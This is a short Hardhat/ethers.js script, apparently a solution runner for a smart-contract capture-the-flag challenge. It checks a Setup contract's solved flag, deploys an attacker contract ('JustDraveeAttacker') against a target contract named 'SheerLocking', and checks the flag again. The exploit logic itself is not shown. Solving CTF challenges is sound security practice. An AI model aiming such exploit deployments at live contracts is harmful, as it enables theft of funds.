const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("JustDraveeAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x1f5c09a7d6a9B30b43DDDAABD384425DEe0ADe91" );
  const ctf = await ethers.getContractAt( "SheerLocking", "0xc7e13b9c94Eb3902Fa272E83Bb4D19392d09eF4d" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address, { value: 24725 });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
